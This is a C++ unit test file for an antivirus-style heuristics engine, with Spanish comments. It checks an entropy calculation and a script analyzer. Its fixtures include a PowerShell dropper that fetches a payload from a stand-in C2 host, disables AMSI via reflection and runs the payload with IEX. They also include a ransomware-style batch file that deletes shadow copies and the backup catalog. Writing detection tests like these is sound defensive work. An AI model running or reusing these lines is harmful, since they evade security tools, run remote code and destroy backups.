/**
 * @file test_heuristics.cpp
 * @brief Pruebas unitarias para el motor de heurísticas y analizador de scripts.
 */

#include "openguard/heuristics.h"
#include "openguard/pe_analyzer.h"

#include <gtest/gtest.h>
#include <filesystem>
#include <fstream>
#include <vector>

class HeuristicsTest : public ::testing::Test {
protected:
    void SetUp() override {
        m_testDir = std::filesystem::temp_directory_path() / "openguard_heur_test";
        std::filesystem::create_directories(m_testDir);
    }

    void TearDown() override {
        std::error_code ec;
        std::filesystem::remove_all(m_testDir, ec);
    }

    std::filesystem::path m_testDir;
};

// Probar que el cálculo de entropía de Shannon sea matemáticamente correcto
TEST_F(HeuristicsTest, ShannonEntropyCalculation) {
    // 1. Datos constantes (todos ceros) deben tener entropía 0.0
    std::vector<uint8_t> zeroData(1024, 0x00);
    double zeroEntropy = openguard::PEAnalyzer::calculateShannonEntropy(zeroData.data(), zeroData.size());
    EXPECT_DOUBLE_EQ(zeroEntropy, 0.0);

    // 2. Datos con distribución uniforme de los 256 bytes deben tener entropía cercana a 8.0
    std::vector<uint8_t> uniformData(256 * 10);
    for (size_t i = 0; i < uniformData.size(); ++i) {
        uniformData[i] = static_cast<uint8_t>(i % 256);
    }
    double maxEntropy = openguard::PEAnalyzer::calculateShannonEntropy(uniformData.data(), uniformData.size());
    EXPECT_NEAR(maxEntropy, 8.0, 0.001);
}

// Probar detección de script de PowerShell malicioso con evasión de AMSI y descarga sigilosa
TEST_F(HeuristicsTest, DetectsMaliciousPowerShellScript) {
    auto psScript = m_testDir / "dropper.ps1";
    std::ofstream ofs(psScript);
    ofs << "$client = New-Object System.Net.WebClient;\n"
        << "$payload = $client.DownloadString('http://c2-malicioso.com/stage.ps1');\n"
        << "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);\n"
        << "IEX $payload;\n";
    ofs.close();

    openguard::ScriptAnalyzer analyzer;
    auto report = analyzer.analyze(psScript);

    EXPECT_EQ(report.scriptType, "PowerShell");
    EXPECT_GT(report.riskScore, 60); // Debe ser clasificado con riesgo alto
    EXPECT_FALSE(report.findings.empty());

    bool foundAmsi = false;
    bool foundDownload = false;
    for (const auto& finding : report.findings) {
        if (finding.find("AMSI") != std::string::npos) foundAmsi = true;
        if (finding.find("descarga") != std::string::npos || finding.find("WebClient") != std::string::npos) foundDownload = true;
    }
    EXPECT_TRUE(foundAmsi);
    EXPECT_TRUE(foundDownload);
}

// Probar que un script de PowerShell benigno no active falsas alarmas críticas
TEST_F(HeuristicsTest, CleanPowerShellScriptStaysClean) {
    auto cleanPs = m_testDir / "backup_diario.ps1";
    std::ofstream ofs(cleanPs);
    ofs << "# Script de copia de seguridad local\n"
        << "Get-ChildItem -Path 'C:\\Reportes' | Compress-Archive -DestinationPath 'C:\\Backups\\rep.zip'\n"
        << "Write-Host 'Copia completada con exito'\n";
    ofs.close();

    openguard::ScriptAnalyzer analyzer;
    auto report = analyzer.analyze(cleanPs);

    EXPECT_EQ(report.riskScore, 0);
    EXPECT_TRUE(report.findings.empty());
}

// Probar detección de script Batch destructivo estilo ransomware
TEST_F(HeuristicsTest, DetectsRansomwareDestructiveBatch) {
    auto batScript = m_testDir / "ransom_prep.bat";
    std::ofstream ofs(batScript);
    ofs << "@echo off\n"
        << "vssadmin.exe delete shadows /all /quiet\n"
        << "wbadmin delete catalog -quiet\n";
    ofs.close();

    openguard::ScriptAnalyzer analyzer;
    auto report = analyzer.analyze(batScript);

    EXPECT_GT(report.riskScore, 60);
    bool foundVss = false;
    for (const auto& finding : report.findings) {
        if (finding.find("vssadmin") != std::string::npos) foundVss = true;
    }
    EXPECT_TRUE(foundVss);
}

